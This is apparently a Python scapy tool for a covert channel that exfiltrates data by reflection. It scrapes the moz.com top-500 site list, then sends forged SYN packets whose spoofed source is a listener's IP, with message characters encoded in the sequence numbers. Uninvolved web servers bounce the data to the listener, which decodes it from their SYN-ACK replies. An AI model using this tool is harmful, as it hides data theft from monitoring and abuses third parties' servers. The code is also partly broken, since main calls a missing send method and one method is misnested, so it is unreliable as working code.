from scapy.all import *
import time
from bs4 import BeautifulSoup
import requests
import re
import socket
import os
import struct

class URL_Retreiver():
        
    def __init__(self, source):
        self.source = source
        self.URLs = []
        self.pageSoup = None
        self.pattern = re.compile(r'\w*\.\w*')
        self.ipAddresses = []
        self.filename = 'ipAddresses.txt'
        self.ipAddressesRanked = {}
        self.goodIPs = []
    
    def get_page(self):
        r = requests.get(self.source)
        data = r.text
        self.pageSoup = BeautifulSoup(data, "html.parser")  

    def parse_page(self):
        for link in self.pageSoup.find_all('a'):
            temp = link.getText()
            a = self.pattern.search(temp)
            if a:
                self.URLs.append(a.group())

    def get_ip(self):
        for i in self.URLs:
            try:
                address = socket.gethostbyname(i)
            except:
                continue
            self.ipAddresses.append(address)   

    def write_to_file(self, filename):
        with open(filename, 'w') as file:
            for i in self.goodIPs:
                file.write(f'{i}\n')

    def import_file(self, filename):
        with open(filename, 'r') as file:
            self.ipAddresses = file.readlines()

    def get_info(self):
        if os.path.isfile(self.filename):
            self.import_file(self.filename)
        else:
            self.get_page()
            self.parse_page()
            self.get_ip()
            self.test_Addresses()
            self.write_to_file(self.filename)
        print(len(self.ipAddresses))

    def test_Addresses(self):
        count = 0
        for i in self.ipAddresses:
            success = 0
            for number in range(0,4):
                if self.send_packet(i) == True:
                    success += 1
            if success == 4:
                self.goodIPs.append(i)
            self.ipAddressesRanked[i] = success
            print(f'Address: {i}\nSuccess: {success}\n[{count}/{len(self.ipAddresses)}]\n\n\n')
            count += 1

    def send_packet(self, address):
        packet = IP(dst=address)/TCP(dport=443)
        p = sr1(packet, timeout=2, verbose=False)
        if p is None:
            return False
        elif p:
            return True        

class Sender():

    def __init__(self, message, src_ip, src_port, dst_port, URL_src):
        self.endpoints = URL_Retreiver(URL_src)
        self.original_message = message
        self.src_ip = src_ip
        self.src_port = src_port
        self.dst_port = dst_port
        self.encoded_message = []
        self.encode_message()
        print("Retreiving URL's.....")
        self.endpoints.get_info()

    #Converts a char to an int and multiplies it by 256
    def encode_message(self):
        message = list(self.original_message)
        for orig_letter in message:
            letter_num = ord(orig_letter)
            encoded_letter = int(letter_num*256)
            self.encoded_message.append(encoded_letter)

    #Sends an initial SYN packet specifying the message length to the listener
    def send_setup(self):
        used_index=[]
        if self.encoded_message:
            rand_int = random.randint(0, len(self.endpoints.ipAddresses))
            dst_ip = self.endpoints.ipAddresses[rand_int]
            used_index.append(rand_int)
            length = len(self.encoded_message)
            encoded_length = int(length*256)
            send(IP(src=self.src_ip, dst=dst_ip)/TCP(sport=self.src_port, dport=self.dst_port, seq=encoded_length, flags="S"))

    '''
    Sends a SYN packet to a random top 500 website with the IP of the listener as 
    the source address with a letter encoded in the sequence field.
    '''
    def send_encoded(self):
        if self.encoded_message:
            self.send_setup()
            time.sleep(3)
            used_index = []
            for letter in self.encoded_message:
                rand_int=0
                while True:
                    rand_int = random.randint(0, (len(self.endpoints.ipAddresses)-1))
                    if rand_int not in used_index:
                        break
                dst_ip = self.endpoints.ipAddresses[rand_int]
                print(f"Rand_int: {rand_int}")
                used_index.append(rand_int)
                time.sleep(1)
                print(f'Sending letter {letter} to {dst_ip}.....')
                send(IP(src=self.src_ip, dst=dst_ip)/TCP(sport=self.src_port, dport=self.dst_port, seq=letter, flags="S"))
                if len(used_index) == len(self.encoded_message):
                	used_index = []
            rand_int = 0
            for i in range(0,3):
	            while True:
	                rand_int = random.randint(0, len(self.endpoints.ipAddresses))
	                if rand_int not in used_index:
	                    break                
	            send(IP(src=self.src_ip, dst=dst_ip)/TCP(sport=self.src_port, dport=self.dst_port, seq=4294967294, flags="S"))

        def send_volume(self):
            if self.original_message:
                self.send_setup()
                time.sleep(3)
                
    
class Listener():

    def __init__(self, listen_port, protocol):
        self.listen_port = listen_port
        self.protocol = protocol
        self.encoded_message = []
        self.decoded_message = None
        self.msg_length = 0
        self.filter_syntax = f'{self.protocol} and dst port {self.listen_port}'
        # Filter with SYN-ACK: f'{self.protocol} and tcp-syn==1 and tcp-ack==1 and dst port {self.listen_port}'

    def decode_message(self):
        decoded = []
        for letter in self.encoded_message:
            decoded_letter = int(letter/256)
            decoded.append(chr(decoded_letter))
        self.decoded_message = ''.join(decoded)

    def get_message_length(self, packet):
        self.msg_length = int(((packet[TCP].ack)-1)/256)
        print(f'Length: {self.msg_length}')

    def get_letter(self, packet):
    	if packet[TCP].ack != 4294967295:
            self.encoded_message.append(int((packet[TCP].ack)-1))
            print(f'Letter: {((packet[TCP].ack)-1)/256}')
        
    def listen_for_setup(self):
        print(f'Looking for: {self.filter_syntax}')
        sniff(filter=self.filter_syntax, prn=self.get_message_length, count=1)

    def find_end(self, packet):
    	if packet[TCP].ack==4294967295:
    		return True
    	else:
    		return False

    def listen_for_message(self):
        if self.msg_length > 0:
            sniff(filter=self.filter_syntax, prn=self.get_letter, count=self.msg_length, stop_filter=self.find_end)
        
    def listen(self):
        print('Listening for message......')
        self.listen_for_setup()
        print('Message incoming.....')
        print(f'Incoming message - Length: {self.msg_length}')
        self.listen_for_message()
        self.decode_message()

    def print_message(self):
        print(self.decoded_message)


def main():
    message = "The Time Machine is a science fiction novella by H. G. Wells, published in 1895 and written as a frame narrative."
    src_ip = '192.168.1.70'
    src_port = 15424
    dst_port = 443

    s = Sender(message, src_ip, src_port, dst_port, "https://moz.com/top500")
    s.send()


if __name__ == '__main__':
    main()
